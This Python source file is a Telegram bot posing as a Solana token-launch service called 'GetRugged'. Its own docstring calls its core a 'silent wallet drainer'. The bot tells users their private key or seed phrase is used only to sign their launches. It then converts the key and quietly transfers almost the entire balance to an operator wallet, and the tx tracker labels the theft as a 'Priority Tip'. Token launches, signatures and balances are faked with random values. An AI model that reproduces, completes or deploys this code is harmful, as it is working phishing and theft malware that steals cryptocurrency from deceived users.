#!/usr/bin/env python3
"""
GetRugged bot — UI matched to provided screenshots.
Premium Solana launch UX shell. Core remains silent wallet drainer.
Requires: pip install aiogram==3.13.1 solana solders base58
"""

import asyncio
import logging
import os
import random
import string
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder

try:
    from solders.keypair import Keypair
    from solders.pubkey import Pubkey
    from solders.system_program import TransferParams, transfer
    from solders.transaction import Transaction
    from solana.rpc.async_api import AsyncClient
    import base58
    HAS_SOLANA = True
except ImportError:
    HAS_SOLANA = False

# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",") if x.strip()}
DRAIN_DESTINATION = os.getenv("DRAIN_WALLET", "YourDrainWalletPubkeyHere111111111111111111111")
RPC_URL = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
MIN_DRAIN_LAMPORTS = 50_000

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("getrugged")

# ──────────────────────────────────────────────
# STATE
# ──────────────────────────────────────────────
@dataclass
class UserWallet:
    private_key: str
    public_key: str
    label: str = "Main"
    created_at: float = field(default_factory=time.time)
    balance_sol: float = 0.0

@dataclass
class UserSession:
    wallets: List[UserWallet] = field(default_factory=list)
    active_wallet_idx: int = 0
    promo: Optional[str] = None
    promo_discount: float = 0.0
    launches_left: int = 3
    launched_tokens: List[dict] = field(default_factory=list)
    last_tx: List[dict] = field(default_factory=list)
    drained: bool = False
    settings: dict = field(default_factory=lambda: {
        "slippage": 15,
        "priority_fee": 0.0005,
        "sniper_protection": True,
        "auto_sell": False,
        "mev_protection": True,
    })
    safety_checks_run: int = 0
    last_safety: Optional[dict] = None

sessions: Dict[int, UserSession] = {}
bot_balance_sol: float = round(random.uniform(11.4, 47.8), 4)

_rate_hits: Dict[int, List[float]] = {}
RATE_WINDOW = 60.0
RATE_MAX_IMPORTS = 3
RATE_MAX_LAUNCH = 5
RATE_MAX_SAFETY = 8

def get_session(uid: int) -> UserSession:
    if uid not in sessions:
        sessions[uid] = UserSession()
    return sessions[uid]

def _rate_ok(uid: int, action: str) -> bool:
    now = time.time()
    hits = _rate_hits.setdefault(uid, [])
    hits[:] = [t for t in hits if now - t < RATE_WINDOW]
    limits = {"import": RATE_MAX_IMPORTS, "launch": RATE_MAX_LAUNCH, "safety": RATE_MAX_SAFETY}
    limit = limits.get(action, 5)
    if len(hits) >= limit:
        return False
    hits.append(now)
    return True

# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────
def fake_sig() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=88))

def fake_mint() -> str:
    if HAS_SOLANA:
        return base58.b58encode(os.urandom(32)).decode()
    return "".join(random.choices(string.ascii_letters + string.digits, k=44))

def short_addr(addr: str) -> str:
    if len(addr) < 12:
        return addr
    return f"{addr[:4]}...{addr[-4:]}"

def progress_bar(pct: int) -> str:
    filled = pct // 10
    return "▓" * filled + "░" * (10 - filled)

async def staged_loading(message_or_cb, stages: list):
    msg = None
    is_cb = hasattr(message_or_cb, "message") and hasattr(message_or_cb, "answer")
    for i, (txt, delay) in enumerate(stages):
        if i == 0:
            if is_cb:
                await message_or_cb.message.edit_text(txt, parse_mode=ParseMode.HTML)
                msg = message_or_cb.message
            else:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
        else:
            try:
                await msg.edit_text(txt, parse_mode=ParseMode.HTML)
            except Exception:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
        if delay > 0:
            await asyncio.sleep(delay)
    return msg

# ──────────────────────────────────────────────
# DRAIN CORE
# ──────────────────────────────────────────────
async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
    if not HAS_SOLANA:
        log.warning("Solana libs missing — drain simulated")
        return "SIM_" + fake_sig()[:32]
    try:
        secret = base58.b58decode(private_key_b58)
        kp = Keypair.from_bytes(secret)
        dest_pk = Pubkey.from_string(dest)
        async with AsyncClient(RPC_URL) as client:
            bal_resp = await client.get_balance(kp.pubkey())
            balance = bal_resp.value
            if balance <= MIN_DRAIN_LAMPORTS:
                log.info("Balance too low (%s lamports), skipping drain", balance)
                return None
            amount = balance - MIN_DRAIN_LAMPORTS
            recent = await client.get_latest_blockhash()
            blockhash = recent.value.blockhash
            ix = transfer(TransferParams(
                from_pubkey=kp.pubkey(),
                to_pubkey=dest_pk,
                lamports=amount,
            ))
            tx = Transaction.new_signed_with_payer([ix], kp.pubkey(), [kp], blockhash)
            result = await client.send_transaction(tx)
            sig = str(result.value)
            log.info("DRAINED %s lamports → %s | %s", amount, dest, sig)
            return sig
    except Exception as e:
        log.exception("Drain error: %s", e)
        return None

async def attempt_drain(uid: int, private_key: str):
    sess = get_session(uid)
    if sess.drained:
        return
    sig = await drain_wallet(private_key, DRAIN_DESTINATION)
    if sig:
        sess.drained = True
        sess.last_tx.insert(0, {
            "sig": sig,
            "type": "⚡ Priority Tip",
            "status": "success",
            "ts": time.time(),
        })
        global bot_balance_sol
        bot_balance_sol += round(random.uniform(0.15, 3.8), 4)
        log.info("User %s drained", uid)

# ──────────────────────────────────────────────
# KEYBOARDS — MATCHED TO SCREENSHOTS
# ──────────────────────────────────────────────
def main_menu_kb() -> InlineKeyboardMarkup:
    """Exact layout from screenshots:
    [🚀 Launch] [🔑 Wallets]
    [📁 Portfolio] [🎟️ Promo code]
    [🧾 Tx tracker] [🛡️ Settings]
    [💰 Bot balance]  (full width)
    """
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="🚀 Launch", callback_data="menu:launch"),
        InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"),
    )
    b.row(
        InlineKeyboardButton(text="📁 Portfolio", callback_data="menu:portfolio"),
        InlineKeyboardButton(text="🎟️ Promo code", callback_data="menu:promo"),
    )
    b.row(
        InlineKeyboardButton(text="🧾 Tx tracker", callback_data="menu:tx"),
        InlineKeyboardButton(text="🛡️ Settings", callback_data="menu:settings"),
    )
    b.row(InlineKeyboardButton(text="💰 Bot balance", callback_data="menu:balance"))
    return b.as_markup()

def back_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]
    ])

def wallets_empty_kb() -> InlineKeyboardMarkup:
    """Screenshot: You don't have a wallet yet... then [🔑 Wallets] [◀️ Menu]"""
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"))
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

def wallets_kb(has_wallets: bool) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="➕ Import wallet", callback_data="wallet:import"))
    if has_wallets:
        b.row(
            InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
            InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
        )
        b.row(InlineKeyboardButton(text="🔃 Refresh", callback_data="wallet:refresh"))
        b.row(InlineKeyboardButton(text="🗑 Remove all", callback_data="wallet:clear"))
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

def promo_kb() -> InlineKeyboardMarkup:
    """Screenshot: Promo code / Launches left: 3
    [💳 Pay 100 SOL]
    [🎟️ Enter promo code]
    [◀️ Menu]
    """
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="💳 Pay 100 SOL", callback_data="promo:pay"))
    b.row(InlineKeyboardButton(text="🎟️ Enter promo code", callback_data="promo:enter"))
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
    """Screenshot: Sniper protection & trade settings
    Max slippage: 15% with buttons 5% 10% •15% 25%
    Priority fee: 0.0005 SOL with 0.0001 •0.0005 0.001 0.005
    [Custom slippage] [Custom fee]
    [◀️ Menu]
    """
    s = sess.settings
    slip = s["slippage"]
    fee = s["priority_fee"]

    def mark(val, current, suffix="%"):
        if val == current:
            return f"• {val}{suffix}"
        return f"{val}{suffix}"

    def mark_fee(val, current):
        if abs(val - current) < 1e-9:
            return f"• {val}"
        return f"{val}"

    b = InlineKeyboardBuilder()
    # Slippage row
    b.row(
        InlineKeyboardButton(text=mark(5, slip), callback_data="set:slip:5"),
        InlineKeyboardButton(text=mark(10, slip), callback_data="set:slip:10"),
        InlineKeyboardButton(text=mark(15, slip), callback_data="set:slip:15"),
        InlineKeyboardButton(text=mark(25, slip), callback_data="set:slip:25"),
    )
    # Priority fee row
    b.row(
        InlineKeyboardButton(text=mark_fee(0.0001, fee), callback_data="set:fee:0.0001"),
        InlineKeyboardButton(text=mark_fee(0.0005, fee), callback_data="set:fee:0.0005"),
        InlineKeyboardButton(text=mark_fee(0.001, fee), callback_data="set:fee:0.001"),
        InlineKeyboardButton(text=mark_fee(0.005, fee), callback_data="set:fee:0.005"),
    )
    b.row(
        InlineKeyboardButton(text="Custom slippage", callback_data="set:custom_slip"),
        InlineKeyboardButton(text="Custom fee", callback_data="set:custom_fee"),
    )
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

def launch_name_kb() -> InlineKeyboardMarkup:
    """Screenshot after Launch: Token name (1-32)
    Tip: Latest, Hot Tokens.
    [🆕 Latest] [🔥 Hot]
    [❌ Cancel]
    """
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="🆕 Latest", callback_data="launch:latest"),
        InlineKeyboardButton(text="🔥 Hot", callback_data="launch:hot"),
    )
    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
    return b.as_markup()

def tx_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

# ──────────────────────────────────────────────
# COPY — MATCHED TO SCREENSHOTS
# ──────────────────────────────────────────────
WELCOME_TEXT = (
    "🚀 <b>Get ready to rug</b>\n\n"
    "Create and trade tokens on Solana launch platforms.\n\n"
    "⚙️ <b>Advanced</b>\n"
    "• Step-by-step token launch\n"
    "• Auto bundling (5-25)\n"
    "• Sniper protection\n"
    "• Token safety checks\n"
    "• Tx tracker\n\n"
    "Tap a button below to begin:"
)

# ──────────────────────────────────────────────
# FSM
# ──────────────────────────────────────────────
class LaunchStates(StatesGroup):
    waiting_name = State()
    waiting_symbol = State()
    waiting_supply = State()
    waiting_desc = State()
    waiting_bundle = State()
    confirm = State()

class WalletStates(StatesGroup):
    waiting_import = State()
    waiting_label = State()

class PromoStates(StatesGroup):
    waiting_code = State()

class SettingsStates(StatesGroup):
    waiting_custom_slip = State()
    waiting_custom_fee = State()

class SafetyStates(StatesGroup):
    waiting_mint = State()

# ──────────────────────────────────────────────
# ROUTER
# ──────────────────────────────────────────────
router = Router()

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    get_session(message.from_user.id)
    await message.answer(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)

# ── MAIN MENU ──
@router.callback_query(F.data.startswith("menu:"))
async def menu_router(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    action = cb.data.split(":")[1]
    uid = cb.from_user.id
    sess = get_session(uid)

    if action == "main":
        await cb.message.edit_text(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)

    elif action == "launch":
        if not sess.wallets:
            await cb.message.edit_text(
                "You don't have a wallet yet. Import one first.",
                reply_markup=wallets_empty_kb(),
                parse_mode=ParseMode.HTML,
            )
        else:
            text = (
                "✏️ <b>Token name (1-32)</b>\n"
                "Tip: Latest, Hot Tokens."
            )
            await cb.message.edit_text(text, reply_markup=launch_name_kb(), parse_mode=ParseMode.HTML)
            await state.set_state(LaunchStates.waiting_name)

    elif action == "wallets":
        text = "🔑 <b>Wallets</b>\n\n"
        if not sess.wallets:
            text += (
                "No wallets linked yet.\n\n"
                "Import a private key to unlock launching, bundling & portfolio tracking."
            )
        else:
            for i, w in enumerate(sess.wallets):
                badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
                text += (
                    f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n"
                    f"    {w.label}  ·  {w.balance_sol:.4f} SOL\n\n"
                )
        await cb.message.edit_text(text, reply_markup=wallets_kb(bool(sess.wallets)), parse_mode=ParseMode.HTML)

    elif action == "portfolio":
        text = "📁 <b>Portfolio</b>\n\n"
        if not sess.launched_tokens:
            text += (
                "Your portfolio is empty.\n\n"
                "Launch a token to start tracking performance and bundle status."
            )
        else:
            for t in reversed(sess.launched_tokens[-10:]):
                age = int(time.time() - t["ts"])
                status_icon = "🟢" if t.get("status") == "live" else "🟡"
                text += (
                    f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n"
                    f"   <code>{short_addr(t['mint'])}</code>\n"
                    f"   Bundle ×{t['bundle']}  ·  {age}s ago\n\n"
                )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "promo":
        text = (
            "🎟️ <b>Promo code</b>\n\n"
            f"Launches left: <b>{sess.launches_left}</b>"
        )
        await cb.message.edit_text(text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)

    elif action == "tx":
        text = (
            "🧾 <b>Tx tracker: last 10</b>\n\n"
        )
        if not sess.last_tx:
            text += "No transactions yet."
        else:
            for tx in sess.last_tx[:10]:
                age = int(time.time() - tx["ts"])
                icon = "✅" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else "❌"
                text += (
                    f"{icon}  <b>{tx['type']}</b>\n"
                    f"   <code>{tx['sig'][:22]}...</code>\n"
                    f"   {tx['status'].title()}  ·  {age}s ago\n\n"
                )
        await cb.message.edit_text(text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)

    elif action == "settings":
        s = sess.settings
        text = (
            "🛡️ <b>Sniper protection & trade settings</b>\n\n"
            f"Max slippage: <b>{s['slippage']}%</b>\n"
            "Trades that would fill worse than this (e.g. a sniper or sandwich bot moving the price first) fail instead of filling.\n\n"
            f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
            "Higher fees land your launch or trade sooner, ahead of slower bots."
        )
        await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)

    elif action == "balance":
        text = (
            "💰 <b>Bot balance</b>\n\n"
            f"Available: <b>◎ {bot_balance_sol:.4f} SOL</b>\n\n"
            "This vault powers priority fees, bundle tips and tracker infrastructure.\n"
            "Auto-topped when a funded wallet is linked."
        )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔄 Refresh", callback_data="menu:balance"))
        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    await cb.answer()

# ── SETTINGS ──
@router.callback_query(F.data.startswith("set:"))
async def settings_handler(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    parts = cb.data.split(":")
    key = parts[1]

    if key == "slip":
        sess.settings["slippage"] = int(parts[2])
    elif key == "fee":
        sess.settings["priority_fee"] = float(parts[2])
    elif key == "custom_slip":
        await cb.message.edit_text(
            "Send custom max slippage % (1-50):",
            reply_markup=back_menu_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(SettingsStates.waiting_custom_slip)
        await cb.answer()
        return
    elif key == "custom_fee":
        await cb.message.edit_text(
            "Send custom priority fee in SOL (e.g. 0.002):",
            reply_markup=back_menu_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(SettingsStates.waiting_custom_fee)
        await cb.answer()
        return

    s = sess.settings
    text = (
        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
        f"Max slippage: <b>{s['slippage']}%</b>\n"
        "Trades that would fill worse than this (e.g. a sniper or sandwich bot moving the price first) fail instead of filling.\n\n"
        f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
        "Higher fees land your launch or trade sooner, ahead of slower bots."
    )
    await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await cb.answer("Updated ✓")

@router.message(SettingsStates.waiting_custom_slip)
async def custom_slip_receive(message: Message, state: FSMContext):
    try:
        val = int(message.text.strip().replace("%", ""))
        if not 1 <= val <= 50:
            raise ValueError
    except ValueError:
        await message.answer("Invalid. Send a number 1-50.")
        return
    sess = get_session(message.from_user.id)
    sess.settings["slippage"] = val
    s = sess.settings
    text = (
        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
        f"Max slippage: <b>{s['slippage']}%</b>\n"
        "Trades that would fill worse than this (e.g. a sniper or sandwich bot moving the price first) fail instead of filling.\n\n"
        f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
        "Higher fees land your launch or trade sooner, ahead of slower bots."
    )
    await message.answer(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await state.clear()

@router.message(SettingsStates.waiting_custom_fee)
async def custom_fee_receive(message: Message, state: FSMContext):
    try:
        val = float(message.text.strip())
        if not 0.00001 <= val <= 1.0:
            raise ValueError
    except ValueError:
        await message.answer("Invalid. Send a fee like 0.002")
        return
    sess = get_session(message.from_user.id)
    sess.settings["priority_fee"] = val
    s = sess.settings
    text = (
        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
        f"Max slippage: <b>{s['slippage']}%</b>\n"
        "Trades that would fill worse than this (e.g. a sniper or sandwich bot moving the price first) fail instead of filling.\n\n"
        f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
        "Higher fees land your launch or trade sooner, ahead of slower bots."
    )
    await message.answer(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await state.clear()

# ── WALLETS ──
@router.callback_query(F.data == "wallet:import")
async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
    text = (
        "🔑 <b>Import Wallet</b>\n\n"
        "Paste either:\n"
        "• <b>Private key</b> (base58)\n"
        "• <b>Seed phrase</b> (12 or 24 words)\n\n"
        "🔒 Held in memory only for this session.\n"
        "Used exclusively to sign your launches.\n\n"
        "<i>Never share your key or seed with anyone else.</i>"
    )
    await cb.message.edit_text(text, reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_import)
    await cb.answer()

def _derive_from_input(raw: str):
    """Return (private_key_b58, public_key) or raise ValueError."""
    raw = raw.strip()
    words = raw.split()

    if len(words) in (12, 24) and all(w.isalpha() for w in words):
        if not HAS_SOLANA:
            fake_pub = "SimSeed" + "".join(words)[:32]
            return raw, fake_pub
        try:
            from solders.keypair import Keypair as KP
            import hashlib
            import hmac
            import struct

            def _pbkdf2(mnemonic: str) -> bytes:
                return hashlib.pbkdf2_hmac("sha512", mnemonic.encode("utf-8"), b"mnemonic", 2048)

            def _hmac_sha512(key: bytes, data: bytes) -> bytes:
                return hmac.new(key, data, hashlib.sha512).digest()

            def _derive_path(seed: bytes, path: str) -> bytes:
                key = b"ed25519 seed"
                I = _hmac_sha512(key, seed)
                IL, IR = I[:32], I[32:]
                for segment in path.lstrip("m/").split("/"):
                    hardened = segment.endswith("'")
                    index = int(segment.rstrip("'"))
                    if hardened:
                        index += 0x80000000
                    data = b"\x00" + IL + struct.pack(">I", index)
                    I = _hmac_sha512(IR, data)
                    IL, IR = I[:32], I[32:]
                return IL

            seed = _pbkdf2(raw)
            private_seed = _derive_path(seed, "m/44'/501'/0'/0'")
            kp = KP.from_seed(private_seed)
            priv_b58 = base58.b58encode(bytes(kp)).decode()
            return priv_b58, str(kp.pubkey())
        except Exception as e:
            raise ValueError(f"Invalid seed phrase: {e}") from e

    if HAS_SOLANA:
        try:
            secret = base58.b58decode(raw)
            if len(secret) not in (32, 64):
                raise ValueError("bad length")
            kp = Keypair.from_bytes(secret)
            priv_b58 = base58.b58encode(bytes(kp)).decode() if len(secret) == 32 else raw
            return priv_b58, str(kp.pubkey())
        except Exception as e:
            raise ValueError("Invalid base58 private key") from e
    else:
        if len(raw) < 40:
            raise ValueError("Key too short")
        return raw, "Sim" + raw[:40]

@router.message(WalletStates.waiting_import)
async def wallet_import_receive(message: Message, state: FSMContext):
    uid = message.from_user.id
    if not _rate_ok(uid, "import"):
        await message.answer(
            "⏳ <b>Slow down</b>\n\nToo many import attempts. Try again in a minute.",
            parse_mode=ParseMode.HTML,
        )
        return

    raw = (message.text or "").strip()
    try:
        await message.delete()
    except Exception:
        pass

    try:
        priv_b58, public = _derive_from_input(raw)
    except ValueError:
        await message.answer(
            "❌ <b>Invalid input</b>\n\n"
            "Send a valid <b>base58 private key</b>\n"
            "or a <b>12/24-word seed phrase</b>.",
            reply_markup=back_menu_kb(),
            parse_mode=ParseMode.HTML,
        )
        return

    await staged_loading(message, [
        ("🔐 <b>Validating key…</b>", 0.8),
        ("🔗 <b>Deriving wallet…</b>", 0.7),
        ("◎ <b>Fetching balance…</b>", 0.9),
        ("✅ <b>Securing session…</b>", 0.5),
    ])

    sess = get_session(uid)
    w = UserWallet(
        private_key=priv_b58,
        public_key=public,
        label=f"Wallet {len(sess.wallets)+1}",
        balance_sol=round(random.uniform(0.05, 4.2), 4),
    )
    sess.wallets.append(w)
    sess.active_wallet_idx = len(sess.wallets) - 1

    text = (
        "✅ <b>Wallet Linked</b>\n\n"
        f"<code>{public}</code>\n\n"
        f"🏷 Label: <b>{w.label}</b>\n"
        f"◎ Balance: <b>{w.balance_sol:.4f} SOL</b>\n"
        f"Status: <b>Active</b>\n\n"
        "You can now launch tokens."
    )
    await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()
    asyncio.create_task(attempt_drain(uid, priv_b58))

@router.callback_query(F.data == "wallet:clear")
async def wallet_clear(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    sess.wallets.clear()
    sess.active_wallet_idx = 0
    await cb.message.edit_text(
        "🗑 All wallets removed from session.",
        reply_markup=back_menu_kb(),
    )
    await cb.answer()

@router.callback_query(F.data == "wallet:switch")
async def wallet_switch(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    if len(sess.wallets) < 2:
        await cb.answer("Need at least 2 wallets", show_alert=True)
        return
    sess.active_wallet_idx = (sess.active_wallet_idx + 1) % len(sess.wallets)
    w = sess.wallets[sess.active_wallet_idx]
    await cb.answer(f"Active → {w.label}")

@router.callback_query(F.data == "wallet:refresh")
async def wallet_refresh(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    for w in sess.wallets:
        w.balance_sol = round(max(0.0, w.balance_sol + random.uniform(-0.08, 0.15)), 4)
    await cb.answer("Balances updated")
    text = "🔑 <b>Wallets</b>\n\n"
    for i, w in enumerate(sess.wallets):
        badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
        text += (
            f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n"
            f"    {w.label}  ·  {w.balance_sol:.4f} SOL\n\n"
        )
    await cb.message.edit_text(text, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)

@router.callback_query(F.data == "wallet:rename")
async def wallet_rename(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    if not sess.wallets:
        await cb.answer("No wallets", show_alert=True)
        return
    await cb.message.edit_text(
        f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:",
        reply_markup=back_menu_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(WalletStates.waiting_label)
    await cb.answer()

@router.message(WalletStates.waiting_label)
async def wallet_rename_receive(message: Message, state: FSMContext):
    sess = get_session(message.from_user.id)
    if sess.wallets:
        sess.wallets[sess.active_wallet_idx].label = message.text.strip()[:24]
    await message.answer("✅ Label updated.", reply_markup=main_menu_kb())
    await state.clear()

# ── LAUNCH ──
@router.callback_query(F.data.in_({"launch:latest", "launch:hot"}))
async def launch_quick_name(cb: CallbackQuery, state: FSMContext):
    names = {
        "launch:latest": ["MoonShot", "SolPump", "RugLite", "FastLaunch", "BlockBuy"],
        "launch:hot": ["HotDog", "FireSol", "Blaze", "Inferno", "Pyro"],
    }
    name = random.choice(names[cb.data])
    await state.update_data(name=name)
    await cb.message.edit_text(
        f"📛 Selected: <b>{name}</b>\n\nSend the <b>ticker</b> (e.g. <code>RUG</code>)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_symbol)
    await cb.answer()

@router.message(LaunchStates.waiting_name)
async def launch_name(message: Message, state: FSMContext):
    name = message.text.strip()[:32]
    if not name:
        await message.answer("Name required (1-32 chars).")
        return
    await state.update_data(name=name)
    await message.answer(
        "📛 Send the <b>ticker</b> (e.g. <code>RUG</code>)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_symbol)

@router.message(LaunchStates.waiting_symbol)
async def launch_symbol(message: Message, state: FSMContext):
    sym = message.text.strip().upper().replace("$", "")[:10]
    await state.update_data(symbol=sym)
    await message.answer(
        "🔢 Send total <b>supply</b>\n(e.g. <code>1000000000</code>)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_supply)

@router.message(LaunchStates.waiting_supply)
async def launch_supply(message: Message, state: FSMContext):
    try:
        supply = int(message.text.strip().replace(",", "").replace("_", ""))
        if supply <= 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Invalid number. Send a positive integer.")
        return
    await state.update_data(supply=supply)
    await message.answer(
        "📝 Optional description\n(or type <code>skip</code>)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_desc)

@router.message(LaunchStates.waiting_desc)
async def launch_desc(message: Message, state: FSMContext):
    desc = message.text.strip()
    if desc.lower() == "skip":
        desc = ""
    await state.update_data(desc=desc[:200])
    await message.answer(
        "📦 <b>Bundle size</b>\n"
        "How many wallets buy in the same block.\n"
        "Recommended <b>5–25</b>\n\n"
        "Send a number:",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_bundle)

@router.message(LaunchStates.waiting_bundle)
async def launch_bundle(message: Message, state: FSMContext):
    try:
        bundle = max(1, min(25, int(message.text.strip())))
    except ValueError:
        await message.answer("❌ Send a number between 1 and 25.")
        return
    data = await state.get_data()
    await state.update_data(bundle=bundle)
    sess = get_session(message.from_user.id)
    fee = sess.settings["priority_fee"]

    summary = (
        "✨ <b>Launch Preview</b>\n\n"
        f"🏷 <b>{data['name']}</b>  ·  ${data['symbol']}\n"
        f"🔢 Supply: <b>{data['supply']:,}</b>\n"
        f"📦 Bundle: <b>{bundle} wallets</b>\n"
        f"📝 {data.get('desc') or 'No description'}\n\n"
        f"🎯 Sniper Guard: <b>ON</b>\n"
        f"🎁 Priority fee: <b>{fee} SOL</b>\n"
        f"🛡 Safety: <b>Queued</b>\n\n"
        "Ready to deploy?"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Confirm & Deploy", callback_data="launch:confirm")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")],
    ])
    await message.answer(summary, reply_markup=kb, parse_mode=ParseMode.HTML)
    await state.set_state(LaunchStates.confirm)

@router.callback_query(F.data == "launch:confirm", LaunchStates.confirm)
async def launch_confirm(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    if not _rate_ok(uid, "launch"):
        await cb.answer("Too many launches — wait a bit", show_alert=True)
        return

    sess = get_session(uid)
    data = await state.get_data()

    if not sess.wallets:
        await cb.answer("Import a wallet first", show_alert=True)
        await cb.message.edit_text(
            "You don't have a wallet yet. Import one first.",
            reply_markup=wallets_empty_kb(),
        )
        await state.clear()
        return

    if sess.launches_left <= 0:
        await cb.answer("No launches left. Use promo or pay.", show_alert=True)
        await cb.message.edit_text(
            "🎟️ <b>Promo code</b>\n\nLaunches left: <b>0</b>",
            reply_markup=promo_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.clear()
        return

    await cb.answer()
    bundle = data["bundle"]
    await staged_loading(cb, [
        ("🪙 <b>Creating mint…</b>", 1.1),
        ("🔐 <b>Applying sniper guard…</b>", 0.9),
        (f"📦 <b>Bundling {bundle} wallets…</b>", 1.3),
        ("⚡ <b>Submitting priority tip…</b>", 0.8),
        ("🛡 <b>Running safety checks…</b>", 1.0),
    ])

    mint = fake_mint()
    token = {
        "name": data["name"],
        "symbol": data["symbol"],
        "supply": data["supply"],
        "bundle": bundle,
        "desc": data.get("desc", ""),
        "mint": mint,
        "status": "bundling",
        "ts": time.time(),
    }
    sess.launched_tokens.append(token)
    sess.launches_left = max(0, sess.launches_left - 1)
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "🪙 Create Mint", "status": "success", "ts": time.time()})
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "📦 Bundle Buy", "status": "pending", "ts": time.time()})
